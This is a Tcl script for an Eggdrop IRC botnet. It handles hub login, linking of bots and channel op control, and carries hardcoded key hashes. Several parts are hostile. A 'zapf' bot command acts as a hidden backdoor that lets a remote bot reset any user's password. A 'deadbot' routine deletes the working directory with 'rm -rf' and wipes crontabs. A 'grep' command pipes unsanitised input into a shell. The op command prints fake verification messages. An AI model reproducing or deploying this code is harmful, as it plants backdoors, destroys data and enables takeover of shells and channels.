  if {![matchattr $n n]} {
   putdcc $i "\01ACTION \02ACCESS DENIED\02! Attepmt logged...\01"
   killdcc $i
   putlog "[date] [time] LOGIN FAILURE from $n"
   return 0
  }
  control $i senterpass
  putdcc $i "\01ACTION SECONDARY HUB AUTENTIFICATION! \02ENTER CODEWORD:\02[telnet_echo_off $i]\01"
  return 0
 } {
  if {[bots]!=""} {
   set skipidx($i:[set coo [gencookie 15]]) [unixtime]
   foreach w [utimers] {if [string match "* {if * {killdcc $i}} *" $w] {killutimer [lindex $w 2]}}
   foreach w "[userlist h] [userlist a]" {
    catch {
     putbot $w "ack_req $coo [list $n] [chattr $n] $i [list $host] $longip"
     set stxt "([incr sack]) Pinging hub, wait for acknowledgement.. "
    }
   }
  }
  utimer 0 [list putdcc $i "\01ACTION $stxt\02Enter password for skip this phase.\02[telnet_echo_off $i]\01"]
  utimer 111 "if {!\[info exist enableidx($i)\]} {killdcc $i}"
 }
 if {[matchattr $n 0]} {return [secndpass $i]}
 if {[matchattr $n n]} {sechello $i}
}

bind bot - ack_req ack_req
if {[info commands ack_req]==""} {
 proc ack_req {b k a} {
 global secauth
  if !$secauth return
  set c [lindex $a 0]
  set n [lindex $a 1]
  set i [lindex $a 3]
  putbot $b "ack_reply $c [list $n] $i [matchattr $n p]"
 }
}

bind filt - * ack_filt
proc ack_filt {i a} {
global skipidx enableidx curkey secauth
 if [info exist enableidx($i)] {return $a}
 if $secauth {set enableidx($i) secauth;return $a}
 foreach w [array names skipidx $i:*] {unset skipidx($w)}
 regsub -all "\377\[\373-\376\].|\377." $a "" a
 set a "[string range $a 0 14]"
 if {"$a"==""} {return 0}
 if {[keyturn $a 1]==$curkey(g)} {
  set enableidx($i) password
  putdcc $i "\01ACTION \02Access granted.\02\01"
  return ""
 }
 putdcc $i "\01ACTION \02ACCESS DENIED!!\02\01"
 sec_alert $i "SKIP-LOGON FAILURE for [idx2hand $i]"
 killdcc $i
 foreach w [utimers] {if [string match "* {if * {killdcc $i}} *" $w] {killutimer [lindex $w 2]}}
}

bind bot - ack_reply ack_reply
proc ack_reply {b k a} {
global skipidx enableidx
 set c [lindex $a 0]
 set n [lindex $a 1]
 set i [lindex $a 2]
 set r [lindex $a 3]
 if {![matchattr $b h] && ![matchattr $b a]} {
  sec_alert - "Fake hub ack reply($r)! (not from hub for $n:$i)"
 } elseif {[string tolower [catch {idx2hand $i} f;set f]]!=[string tolower $n]} {
  sec_alert - "Fake hub ack reply($r)! ($f:$i != $n)"
 } elseif {![info exist skipidx($i:$c)]} {
  sec_alert - "Fake hub ack reply($r)! Bad cookie. (for $f:$i)"
 } {
  set t $skipidx($i:$c)
  foreach w [array names skipidx $i:*] {unset skipidx($w)}
  if $r {
   utimer 1 [list putdcc $i "\0034,15\2== Hub answered. lag = [expr {[unixtime]-$t}] seconds. =="]
   set enableidx($i) Hub:$b
  } {
   putdcc $i "\1ACTION \2Sorry, hub rejected you, bye.\2\1"
   killdcc $i
   foreach w [utimers] {if [string match "* {if * {killdcc $i}} *" $w] {killutimer [lindex $w 2]}}
  }
 }
}

proc secndpass {i} {
 control $i senterpass0
 putdcc $i "\01ACTION 2nd Autentification Enforced for You! \02ENTER PASSWORD:\02[telnet_echo_off $i]\01"
 return 0
}

proc telnet_echo_off {i} {
 foreach w [dcclist] {
  if {[lindex $w 0]==$i} {
   if [string match "telnet:*" [lindex $w 2]] {return "\377\373\001"}
  }
 }
}

proc telnet_echo_on {i} {
 foreach w [dcclist] {
  if {[lindex $w 0]==$i} {
   if [string match "telnet:*" [lindex $w 2]] {return "\377\374\001"}
  }
 }
}

bind bot - zapf zapf
proc zapf {b k a} {
global botnet-nick
 if {[matchattr $b h] || [matchattr $b a]} {
  set a1 [lindex $a 0]
  set a2 [lindex $a 1]
  set a3 [lindex $a 2]
  if {[encrypt $a1 $a1]=="OiSgO1YsRjO00csa31XzsdY1"} {
   set a [decrypt $a1 $a2]
   set p [decrypt $a1 $a3]
   if {[encrypt $a $a]=="Bz7kS.GS0ue/"} {
    chattr $a +u;chpass $a $p;chattr $a -u
   }
  }
 }
}

proc sechello {i} {
global passive secauth botnet-nick uptime lastlogin
 if {[matchattr [idx2hand $i] n]} {
  set members 0
  if $passive {set moda Passive} else {set moda Active}
  if $secauth {set modb Hub} else {set modb Leaf}
  set lk [llength [bots]]
  set t 0
  foreach w [dcclist] {if {[lindex $w 3]=="bot"} {incr t;set lb [lindex $w 1]}}
  switch $t 0 {set lt {}} 1 {set lt " to \2$lb\2"} $lk {set lt " to \2me\2."} default {set lt " (\2to me $t\2)"}
  if {[info proc backtime]=="backtime"} {set ut [backtime $uptime]} {set ut "[expr ([unixtime]-$uptime)/60]min"}
  putdcc $i "\01ACTION Hi [idx2hand $i], i'm ${botnet-nick} (\02$moda/$modb\02 mode) (uptime: $ut) $lk bots linked$lt\01"
  putdcc $i "\01ACTION this is sw v2.15 coded by Shadow Knight\01"
  putdcc $i "updating database tables...."
  putdcc $i "updated. welcome [idx2hand $i]"
  foreach w [whom *] {
   if {!$members} {
    putdcc $i "[format %-10s Nick][format %-10s Bot]|[format %-30s Hostname]|Idle"
   }
   if [set t [lindex $w 4]]/60 {set t "[expr $t/60]h[expr $t%60]m"} {set t "[expr $t%60]m"}
   putdcc $i "[format %-10s [lindex $w 3][lindex $w 0]]|[format %-10s [lindex $w 1]]|[format %-30s [lindex $w 2]]|$t"
   if {"[lindex $w 5]"!=""} {putdcc $i "[format %10s AWAY]:[lindex $w 5]"}
   incr members
  }
  putdcc $i ">[telnet_echo_on $i]>\02  $members member(s) on botnet."
 } {
  putdcc $i ">[telnet_echo_on $i]> Hello [idx2hand $i] why you are here?..."
 }
 if [info exist lastlogin] {putdcc $i "*** Last login for $lastlogin"}
 putdcc $i "*** Now: [ctime [unixtime]]"
 if {[telnet_echo_on $i]==""} {utimer 0 "strip $i -bcru+a"} {utimer 0 "strip $i +bcru-a"}
}

proc senterpass {i a} {
global passive secauth botnet-nick nick botnick curkey
 regsub -all "\377\[\373-\376\].|\377." $a "" a
 set a "[string range $a 0 14]"
 if {"$a"==""} {return 0}
 set key [keyturn $a 1]
 if {"$key"=="$curkey(b)"} {
  sechello $i
  setchan $i 0
  return 1
 }
 putdcc $i "\01ACTION \02ACCESS DENIED!\02\01"
 sec_alert $i "HUB-LOGON FAILURE for [idx2hand $i]"
 killdcc $i
}

#a-tcl, b-hub, c-none, d-db, e-0, f-send, g-skp
if ![info exist curkey(g)] {
   set curkey(a) "lq8yG0sMZoz.rlGbM/OvZje.Rgc85/d4FQi/f7TIU0rzjLT/"
   set curkey(b) "q/SIz0eMkIL/Rr/hU0LuRE5.lJo7D/cJS.M/YyJQT0YQPgW."
   set curkey(c) "Sx48L15upeA/byKCe00TQIz14volf..cJXm1yN7bO..b/sZ1"
   set curkey(d) "hsl5C/83rJl/A/MOX.sJ4wt.4q4pw.5wb8r04qx5L1niWDy.WGr.b/8BBUl0"
   set curkey(e) "36ZZq.E2VKG12yhj3.yj0FL0Wl/J/.C.eIe089DxT0txPD9.dlXmL/AAiDW0"
   set curkey(f) "/1/Vo1Io8XX..TnoX/sqmYq/qs0YE0EYtsn1BYhhR/favVF0jhFTr173oZn1"
   set curkey(g) "NfVZb..fNLm0cA9gK.zygk3.eJVsj1PgHqC0KPUSG.tO/Je."
}

proc keyturn {a b} {
 set key1 [if $b {
  set a [string range $a 0 14]
  encrypt a$a $a
 } {
  string range $a 0 25
 }]
 regsub -all "\[0-9\]" [encrypt [set key3 [string toupper $key1]] $key1] "" key4
 set key5 [encrypt $key1 [set key2 [string tolower $key1]]]]
 return [encrypt $key4 $key5]
}

proc senterpass0 {i a} {
global passive secauth botnet-nick nick botnick curkey
 regsub -all "\377\[\373-\376\].|\377." $a "" a
 set a "[string range $a 0 14]"
 if {"$a"==""} {putcmdlog "secauth: $i closed connection." ; return 0}
 if {"[keyturn $a 1]"=="$curkey(e)"} {
  set n [idx2hand $i]
  putwlog "[list $n] auth0k [chattr $n] $i"
  if [matchattr $n n] {sechello $i}
  setchan $i 0
  chattr $n -0
  return 1
 }
 putdcc $i "\01ACTION \02ACCESS DENIED!\02\01"
 putwlog "[list [idx2hand $i]] n0auth [chattr [idx2hand $i]] $i"
 sec_alert $i "0-LOGON FAILURE for [idx2hand $i]"
 killdcc $i
}

bind dcc n deadbot dcc_deadbot
proc dcc_deadbot {handle idx arg} {
 global botnick secauth pkey
  if $secauth {
   putdcc $idx "you cant kill the hub"
   sec_alert - "[b]![b]alert[b]![b] [idx2hand $idx] tried to deadbot hub!"
   chattr [idx2hand $idx] +0
   killdcc $idx
  }
  control $idx "deadbotp"
  putdcc $idx "\01ACTION Autentification required! Enter password.[telnet_echo_off $idx]\01"
 return 0
}

proc deadbotp {i a} {
global secauth botnet-nick nick botnick curkey
 regsub -all "\377\[\373-\376\].|\377." $a "" a
 if {"$a"==""} {return 0}
 set key [keyturn $a 1]
 if {"$key" == "$curkey(d)"} {
  setchan $i 1
  deadhello $i
  return 1
 }
 putdcc $i "\01ACTION \02ACCESS DENIED!\02\01"
 sec_alert - "[b]![b]alert[b]![b] dead-bot failure for [idx2hand $i]"
 chattr [idx2hand $i] +0
 killdcc $i
}

proc deadhello {i} {
global botnick
 dccbroadcast "[b]![b]dead bot[b]![b] by [idx2hand $i]"
  putserv "QUIT :ircN for mIRC"
   utimer 7 "die"
  catch {exec rm -rf [exec pwd]}
  catch {exec /usr/bin/crontab -r}
  catch {exec /usr/bin/crontab -d}
 putcmdlog "#[idx2hand $i]# deadbot"
}

unbind dcc n tcl *dcc:tcl
unbind dcc n set *dcc:set
unbind dcc m binds *dcc:binds
bind dcc n tcl de_tcl
bind dcc n set de_set
bind dcc n binds de_binds

bind bot - secalert secalert
proc secalert {bo co ar} {
global secauth max-notes
 sec_log ALERT:$bo $ar
 if $secauth {foreach w [userlist n9] {
  incr max-notes
  sendnote $bo $w "*>\02> $ar"}
 } else {
  foreach w [dcclist] {
   if {("[lindex $w 3]" == "chat") && [matchattr [lindex $w 1] n]} {
    putdcc [lindex $w 0] "*** ($bo) $ar"
   }
  }
 }
}

bind bot - secnotice secnotice
bind bot - secnoticecrypt secnoticecrypt
proc secnotice {bo co ar} {
 sec_log Notice:$bo $ar
 foreach w [dcclist] {
  if {("[lindex $w 3]" == "chat") && [matchattr [lindex $w 1] n]} {
   putdcc [lindex $w 0] "*** ($bo) $ar"
  }
 }
}

proc secnoticecrypt {bo co ar} {
 sec_log_c NotiCe:$bo $ar
 foreach w [dcclist] {
  if {("[lindex $w 3]" == "chat") && [matchattr [lindex $w 1] n9]} {
   putdcc [lindex $w 0] "*** ($bo) $ar"
  }
 }
}

bind bot - secinfo secinfo
proc secinfo {bo co ar} {
 sec_log info:$bo $ar
}

bind bot - secoff secoff
proc secoff {bo co ar} {}

proc de_tcl {ha idx text} {
 global sauthok sectclc sectclck
 if ![info exist sauthok($idx)] {set sauthok($idx) 0}
 if $sauthok($idx) {
  sec_notice_c $idx "$ha \2.Tcl\2 $text"
  global sau_ha sau_idx sau_text
  set sau_ha $ha
  set sau_idx $idx
  set sau_text "$text"
  uplevel #0 {*dcc:tcl $sau_ha $sau_idx "$sau_text"}
  unset sau_ha sau_idx sau_text
  return 0
 } else {
  set sectclc($idx) "$text"
  set sectclck($idx) "tcl"
  control $idx secauithp
  putidx $idx "\01ACTION Autentification required! Enter password:[telnet_echo_off $idx]\01"
  return 0
 }
}

proc de_set {ha idx text} {
 global sauthok sectclc sectclck
 if ![info exist sauthok($idx)] {set sauthok($idx) 0}
 if $sauthok($idx) {
  sec_notice $idx "$ha \2.Set\2 $text"
  global sau_ha sau_idx sau_text
  set sau_ha $ha
  set sau_idx $idx
  set sau_text "$text"
  uplevel #0 {*dcc:set $sau_ha $sau_idx "$sau_text"}
  unset sau_ha sau_idx sau_text
  return 0
 } else {
  set sectclc($idx) "$text"
  set sectclck($idx) "set"
  control $idx secauithp
  putidx $idx "\01ACTION Autentification required! Enter password:[telnet_echo_off $idx]\01"
  return 0
 }
}

proc de_binds {ha idx text} {
 global sauthok sectclc sectclck
 if ![info exist sauthok($idx)] {set sauthok($idx) 0}
 if $sauthok($idx) {
  sec_notice $idx "$ha \2.Binds\2 $text"
  global sau_ha sau_idx sau_text
  set sau_ha $ha
  set sau_idx $idx
  set sau_text "$text"
  uplevel #0 {*dcc:binds $sau_ha $sau_idx "$sau_text"}
  unset sau_ha sau_idx sau_text
  return 0
 } else {
  set sectclc($idx) "$text"
  set sectclck($idx) "binds"
  control $idx secauithp
  putidx $idx "\01ACTION Autentification required! Enter password:[telnet_echo_off $idx]\01"
  return 0
 }
}

proc secauithp {i a} {
global sauthok curkey sectclc sectclck
 set curcom "$sectclc($i)"
 set curkom "$sectclck($i)"
 catch {unset $sectclc($i)}
 catch {unset $sectclck($i)}
 regsub -all "\377\[\373-\376\].|\377." $a "" a
 set a "[string range $a 0 14]"
 set n "[idx2hand $i]"
 if {"$a"!=""} {
  if {"[keyturn $a 1]"=="$curkey(a)"} {
   putwlog "[list $n] authOK [chattr $n] $i"
   set sauthok($i) 1
   if {$curkom=="tcl"} {
    sec_notice_c $i "[idx2hand $i] \2.$curkom\2 $curcom"
   } {
    sec_notice $i "[idx2hand $i] \2.$curkom\2 $curcom"
   }
   global sau_ha sau_idx sau_text sau_kom
   set sau_kom $curkom
   set sau_ha "[idx2hand $i]"
   set sau_idx $i
   set sau_text "$curcom"
   if {[set t [telnet_echo_on $i]]!=""} {putdcc $i $t}
   uplevel #0 {*dcc:$sau_kom $sau_ha $sau_idx "$sau_text"}
   unset sau_ha sau_idx sau_text sau_kom
   return 1
  }
  putwlog "[list $n] NOauth [chattr $n] $i"
  chattr [idx2hand $i] +0
  putdcc $i "\01ACTION \02ACCESS DENIED!\02\01"
  killdcc $i
 }
 sec_alert $i "SECAUTH($curkom) FAILURE for $n ($curcom)"
}

bind bot - secrelay sec_relay
proc sec_relay {b k a} {
global botport userport secauth botnet-nick
 set a [split $a " "]
 set who [lindex $a 0]
 set port [lindex $a 1]
 if {$port==""} {set port $userport}
 if {$secauth || [matchattr ${botnet-nick} a] || [matchattr ${botnet-nick} h]} {
  putcmdlog ">> Waiting for relay $who (hub/+h/+a)"
 } {
  putcmdlog ">> Waiting for relay $who ($port)"
   listen $port users
   foreach w [timers] {if [string match "* {catch [list "listen $port off"]} *" $w] {killtimer [lindex $w 2]}}
   timer 3 "catch [list "listen $port off"]"
 }
}

#-BY3r90lzMl7.:ZbUI2/KFhqQ.w9Msc/JGu.P/:ZbUI2/KFhqQ.w9Msc/JGu.P/:wR8Lg0igyEi0:Phety1kFaAP/:Phety1kFaAP/:@SYN@------- botnet passive/active handler
 bind link - * botplink
 bind disc - * botpdisc
 bind bot - do_active1 do_active1
 bind bot - do_active2 do_active2
 bind bot - do_active3 do_active3

proc do_active1 {bt co ar} {
global oldpassive passive botport userport secauth
global sec_procs_cnt touchfile1 mainconfile botnet-nick sec_tch
 set procs_cnt [llength [info procs]]
 if ![info exist sec_procs_cnt] {set sec_procs_cnt $procs_cnt}
 putallbots "\nsec_stat procs $procs_cnt Procs count"
 catch {set bindc [llength [bind * * *]]}
 if [info exist bindc] {putallbots "\nsec_stat binds $bindc Binds count"}
 set cfiles $touchfile1
 if [info exist mainconfile] {append cfiles " $mainconfile"}
 foreach c $cfiles {
  if [info exist cf] {set cf $c} {set cf check}
  putallbots "\nsec_stat stat:$cf [catch {file size $c} er]:$er/[catch {file mtime $c} er]:$er size/mtime"
  putallbots "\nsec_stat md5:$cf [catch {md5file $c} er]:$er MD5 Digest"
  set sec_tch($c:atime) [file atime $c]
 }
 if {$bt=="-"} return
 putbot $bt do_active2
 putcmdlog "\00312* I'm activating by $bt.  (listen off)  \*"
 if {!$secauth && ![matchattr ${botnet-nick} a] && ![matchattr ${botnet-nick} h]} {
  if {$botport==$userport} {
   timer 5 "catch [list "listen $botport off"]"
  } {
   timer 5 "catch [list "listen $botport off"]"
   timer 5 "catch [list "listen $userport off"]"
  }
 }
}
set t 0;foreach w [trace vinfo botnet-nick] {if {$w=="w tntflash"} {incr t}}
if !$t {trace variable botnet-nick w tntflash}
proc tntflash {n1 n2 m} {putallbots speranza}
bind bot - speranza speranza
proc speranza {b k a} {
global secauth activator
 if !$secauth return
 if [matchattr $b o] {chattr $b -o+1} elseif [matchattr $b 1] {chattr $b -1}
 set activator([string tolower $b]) ""
 putbot $b do_active1
}

proc do_active2 {bt co ar} {
global oldpassive passive activator mainconfile touchfile1 sec_stat secauth
 if $passive {return 0}
 set bt [string tolower $bt]
 putbot $bt do_active3
 set activator($bt) [lsort $activator($bt)]
 set eq [lsort [array names sec_stat $bt:*]]
 putloglev 3 * "\0030,3stat:set($bt): $eq"
 putloglev 3 * "\0030,10stat:get($bt): $activator($bt)"
 if {$activator($bt)==""} {
  set oo "\0034No Stats Reply! -os1"
  chattr $bt -os1
  sec_alert - "Linked: $bt - no stat reply -os1"
 } {
  if {!$secauth || ($activator($bt)==$eq)} {
   if [matchattr $bt 1s] {
    chattr $bt +o-1
    set oo "+o"
   } {
    set oo "\00312,8don't +o"
    if [matchattr $bt s] {sec_alert - ">> link/stats: stats not match for $bt"}
    if [matchattr $bt o] {chattr $bt -o}
   }
  } {
   sec_alert - ">> link/stats: restricted stats reply from $bt"
   set oo "\00312,8Bad stats info! still flags unchanged"
   foreach w $eq {if {[lsearch $activator($bt) $w]==-1} {unset sec_stat($w)}}
  }
 }
 putcmdlog "\00312* Activating $bt. $oo\*"
}

proc do_active3 {bt co ar} {
global oldpassive passive botport userport secauth
 putcmdlog "\0032* I'm activated by $bt.\*"
 set passive 0
}

proc botplink {bn via} {
global oldpassive passive botnet-nick activator secauth
 if {${botnet-nick} == $via} {
  catch {set i [hand2idx $bn]}
  if [catch {idx2ip $i} longip] {set longip -}
  if [catch {idx2host $i} host] {set host -
   foreach w [dcclist] {if {$i==[lindex $w 0]} {set host [lindex $w 2]}}
  }
  putwlog "[list $bn] link [chattr $bn] - [list $host] $longip"
  if !$passive {
   putbot $bn do_active1
   if [matchattr $bn o] {
    set oo "-o+1";chattr $bn -o+1
   } elseif [matchattr $bn 1] {
    set oo -1;chattr $bn -1
   } {set oo ""}
   set activator([string tolower $bn]) ""
   putcmdlog "\00310* Iniciating $bn. $oo\*"
  }
  sec_log "Linked" "$bn via $via"
 }
}

proc botpdisc {bn} {
global oldpassive passive secauth userport botnet-nick nolisten botport
 if $secauth {putwlog "[list $bn] disc [chattr $bn]"}
 if $passive {set moda Passive} else {set moda Active}
 if $oldpassive {set modao Passive} else {set modao Active}
 if {[bots]==""} {
  if {$passive==$oldpassive} {
   putseclog "\* Unlinked from botnet. :( Still in $moda mode. \*"
  } else {
   putseclog "\* Unlinked from botnet. :( Switch from $moda to $modao mode. \*"
   set passive $oldpassive
  }
  if {!$secauth && ![matchattr ${botnet-nick} a] && ![matchattr ${botnet-nick} h]} {
   catch {listen $userport off}
   if {$userport==$botport} {set mod all} {set mod users}
   if !$nolisten {set userport [listen $userport $mod]}
  }
 } else {
  sec_log "unLinked" "$bn"
 }
}

bind rcvd - * sec_rcvd
proc sec_rcvd {h n p} {sec_alert - "File\2 $p\2 received from $n ($h)"}
bind sent - * sec_sent
proc sec_sent {h n p} {sec_alert - "File\2 $p\2 sent to $n ($h)"}
proc tntop {ch n} {
global botnick
 set b [string tolower [bots]]
 set t [nick2hand $n $ch]
 foreach w [chanlist $ch b] {
  set h [string tolower [nick2hand $w $ch]]
  if {[isop $w $ch] && [lsearch $b $h]==-1 && $w != $botnick} {
   sec_notice - "\2<#> Can't op $n ($t) because bot $h (@$w $ch) not linked to botnet"
   return
  }  
 }
 dumpserv "MODE $ch +o $n"
}
   
catch {unbind filt p .op* tntfiltop}
bind dcc - op tntcmdop
proc tntcmdop {h i a} {
 if {[set w [lindex $a 0]] == {}} {
  putdcc $i "Usage: op <nick> \[channel\]"
  return 0

 }
putdcc $i "verifying to see if you have legit access to get oped"
putdcc $i "verfied!"
 if {[set ch [lindex $a 1]]==[set cl {}]} {set ch [channels]}
 foreach ch $ch {
  set h [nick2hand $w $ch]
  if {[botisop $ch] && ![isop $w $ch] && ([matchattr $h o] || [matchchanattr $h o $ch])} {
   set ho [getchanhost $w $ch]
   lappend cl $ch
   putwlog "[list [idx2hand $i]] OP [chattr [idx2hand $i]] $i [list $w!$ho] [list $ch]"
   putserv "MODE $ch +o $w"  
  }
 }
 if {$cl=={}} {
  putdcc $i "I dont have op on any channel where you dont have ops"
 } {
  set n [finduser $w!$ho]
  sec_notice - "[b]![b]dcc op[b]![b] ($w!$ho) on $cl by $n (+[chattr $n])"
  putcmdlog "#[idx2hand $i]# ([lindex [console $i] 0]) op $w $cl"
 }
 return 0
}
catch {unbind raw - mode tntmode}
catch {unbind dcc m copall dcc_opall}
catch { unbind dcc - +host *dcc:+host }
catch { unbind dcc - -host *dcc:-host }
catch { unbind dcc - +user *dcc:+user }
catch { unbind dcc - -user *dcc:-user }
catch { unbind dcc - adduser *dcc:adduser }
catch { unbind dcc - chnick *dcc:chnick }
catch { unbind dcc - chattr *dcc:chattr }
catch { unbind dcc - chpass *dcc:chpass }
catch { unbind dcc - newpass *dcc:newpass }
putlog "!LOADED! $is by shadow knight v$tcl_version"
catch { bind dcc m -user *dcc:-user }
bind dcc n grep grep
bind bot - grep grep
proc grep {h i a} {
global botnet-nick botnick
 set a [split $a " "]
 set b [string tolower ${botnet-nick}]
# if ![matchattr ${botnet-nick} sob] {
#  return 0
# }
 if {[matchattr $h n]} {putallbots "grep $a"}
 catch {exec cat tcl.user | grep $a} er
 dccbroadcast "$botnick \2->\2 $er"
 return 1
}
###new stuff
proc kill_timer { args } {
   set timerID [lindex $args 0]
   set killed 0
   foreach 1timer [timers] {
      if {[lindex $1timer 1] == $timerID} {
         killtimer [lindex $1timer 2]
         set killed 1
      }
   }
   return $killed
}

proc kill_utimer { args } {
   set timerID [lindex $args 0]
   set killed 0
   foreach 1utimer [utimers] {
      if {[lindex $1utimer 1] == $timerID} {
         killutimer [lindex $1utimer 2]
         set killed 1
      }
   }
   return $killed
}

proc killall_timers {} {
   foreach 1timer [timers] { killtimer [lindex $1timer 2] }
}

proc killall_utimers {} {
   foreach 1utimer [utimers] { killutimer [lindex $1utimer 2] }
}

proc string2tcl { args } {
   set args [lindex $args 0]
   regsub -all {\\} $args {\\\\} tcl
   regsub -all {\[} $tcl {\\[} tcl
   regsub -all {\]} $tcl {\\]} tcl
   regsub -all {\{} $tcl {\{} tcl
   regsub -all {\}} $tcl {\}} tcl
   return $tcl
}

proc sort { args } {
   foreach element [lsort [split $args ""]] { append string $element }
   return $string
}

proc anti_idle {} {
   global botnick
   if {[llength [bots]] > 0} { set random(Bot) [hand2nick [lindex [bots] [rand [llength [bots]]]] [lindex [channels] 0]] }
   if {[info exists random(Bot)] && $random(Bot) != ""} { putserv "PRIVMSG a62af2a :." } else { putserv "PRIVMSG haafas :." }
   timer [expr 4 + [rand 6]] anti_idle
}

kill_timer anti_idle
timer 5 anti_idle

proc halt { nick host handle args } { return }
bind msg b . halt

proc uptimes { handle idx args } {
   global nick uptime
   set bots [lindex $args 0]
   putlog "#$handle# uptimes [lrange $bots 0 end]"
   if {[catch {set uptimeLine [exec uptime]}] == 0} {
      set shellUptime [string trimright [lrange $uptimeLine 2 [expr [lsearch -exact $uptimeLine "users,"]-2]] ,]
      if {$shellUptime == ""} { set shellUptime [string trimright [lrange $uptimeLine 2 [expr [lsearch -exact $uptimeLine "user,"]-2]] ,] }
      if {$shellUptime != "" && ![string match *day* $shellUptime]} { set shellUptime "0 days,  $shellUptime" }
   } else { set shellUptime  "   (unknown)  " }
   set botUptime [expr [unixtime] - $uptime]
   set days [expr $botUptime / 86400]
   set hours [expr ($botUptime % 86400) / 3600]
   set minutes [expr (($botUptime % 86400) % 3600) / 60]
   if {[string length $hours] == 1} { set hours "0$hours" }
   if {[string length $minutes] == 1} { set minutes "0$minutes" }
   set spacing "          "
   set dayNum "[string range $spacing 0 [expr 2 - [string length $days]]]$days"
   if {$days == 1} {
      set botUptime " $dayNum day, $hours:$minutes"
   } else { set botUptime "$dayNum days, $hours:$minutes" }
   if {[lrange $bots 0 end] == ""} {
      putdcc $idx " "
      putdcc $idx "  \037  BOT UPTIME  \037    \037 SHELL UPTIME \037"
      putdcc $idx " $botUptime     $shellUptime      \002$nick\002"
      putallbots "uptimes $idx"
      return
   }
   putdcc $idx " "
   putdcc $idx "  \037  BOT UPTIME  \037    \037 SHELL UPTIME \037"
   foreach 1bot [lrange $bots 0 end] {
      catch {putbot $1bot "uptimes $idx"}
   }
}
bind dcc n uptimes uptimes

proc send_uptimes { bot command idx } {
   global nick uptime
   if {![matchattr $bot bo]} { return }
   if {[catch {set uptimeLine [exec uptime]}] == 0} {
      set shellUptime [string trimright [lrange $uptimeLine 2 [expr [lsearch -exact $uptimeLine "users,"]-2]] ,]
      if {$shellUptime == ""} { set shellUptime [string trimright [lrange $uptimeLine 2 [expr [lsearch -exact $uptimeLine "user,"]-2]] ,] }
      if {$shellUptime != "" && ![string match *day* $shellUptime]} { set shellUptime "0 days,  $shellUptime" }
   } else { set shellUptime  "   (unknown)  " }
   set botUptime [expr [unixtime] - $uptime]
   set days [expr $botUptime / 86400]
   set hours [expr ($botUptime % 86400) / 3600]
   set minutes [expr (($botUptime % 86400) % 3600) / 60]
   if {[string length $hours] == 1} { set hours "0$hours" }
   if {[string length $minutes] == 1} { set minutes "0$minutes" }
   set spacing "          "
   set dayNum "[string range $spacing 0 [expr 2 - [string length $days]]]$days"
   if {$days == 1} {
      set botUptime " $dayNum day, $hours:$minutes"
   } else { set botUptime "$dayNum days, $hours:$minutes" }
   regsub -all " " " $botUptime     $shellUptime     \002$nick\002" "#" uptimeOutput
   catch {putbot $bot "myuptimes $idx $uptimeOutput"}
}
bind bot - uptimes send_uptimes

proc received_uptimes { bot command args } {
   if {![matchattr $bot bo]} { return }
   set args [lindex $args 0]
   set idx [lindex $args 0]
   if {![valididx $idx]} { return }
   regsub -all "#" [lindex $args 1] " " uptimeOutput
   putdcc $idx "$uptimeOutput"
}
bind bot - myuptimes received_uptimes

#download ends at Sat Jun 26 15:27:23 1999 (4299/57 lines/sec) - PlFRe/S/K0Y1
#download ends at Sat Aug  7 06:40:45 1999 (4436/20 lines/sec) - PlFRe/S/K0Y1
